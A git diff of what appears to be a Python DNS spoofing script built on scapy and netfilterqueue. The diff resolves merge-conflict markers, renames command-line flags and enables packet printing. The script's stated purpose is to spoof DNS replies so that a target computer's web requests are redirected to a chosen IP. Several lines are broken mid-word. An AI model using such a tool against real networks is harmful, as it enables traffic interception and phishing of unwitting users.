@@ -2,10 +2,6 @@ import netfilterqueue
 import scapy.all as scapy
 import subprocess
 import argparse
-<<<<<<< HEAD
-import requests
-=======
->>>>>>> e01080b... Argparse update
 from colorama import init, Fore
 
 GREEN  = Fore.GREEN
@@ -14,11 +10,15 @@ YELLOW = Fore.YELLOW
 
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description='DNS Spoof against target computer , to redirect WEB pages on Local IP')
-    parser.add_argument('-p' , '-ip' , nargs='?' ,  dest='ip' , help='Spoof the DNS query packets of a certain IP address' , required=True)
-    parser.add_argument('-t' , nargs='?' , dest='target' , help='Target Websites , ex: example.com  OR example.com,example2.com')
-    parser.add_argument('-all'  , dest='all', action='store_const', const=True , help='Target All Websites')
-    parser.add_argument('-local', dest='local', action='store_const', const=True , help='Spoof in your Computer , default=target')
+    parser = argparse.ArgumentParser(description='DNS Spoof against target computer , to redirect WEB pages on Local I
+P')
+    parser.add_argument('-p' , '--ip' , nargs='?' ,  dest='ip' , help='Spoof the DNS query packets of a certain IP add
+ress' , required=True)
+    parser.add_argument('-t' , '--target' , nargs='?' , dest='target' , help='Target Websites , ex: example.com  OR ex
+ample.com,example2.com')
+    parser.add_argument('--all'  , dest='all', action='store_const', const=True , help='Target All Websites')
+    parser.add_argument('--local', dest='local', action='store_const', const=True , help='Spoof in your Computer , def
+ault=target')
     args = parser.parse_args()
     if args.target==None and args.all==None:
         parser.error('the following arguments are required: -t/-all')
@@ -26,10 +26,7 @@ def get_arguments():
         return args
 
 
-<<<<<<< HEAD
-=======
-        
->>>>>>> e01080b... Argparse update
+
 def change_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer('DNS Resource Record'):
@@ -49,11 +46,8 @@ def change_packet(packet):
                 
                 packet.set_payload(bytes(scapy_packet))
 
-<<<<<<< HEAD
-              #  print(scapy_packet.show())
-=======
                 print(scapy_packet.show())
->>>>>>> e01080b... Argparse update
+
                 
 
     packet.accept()
@@ -85,7 +79,4 @@ if result.target:
 elif result.all:
     arr = ['']
     process()
-
-
-
 
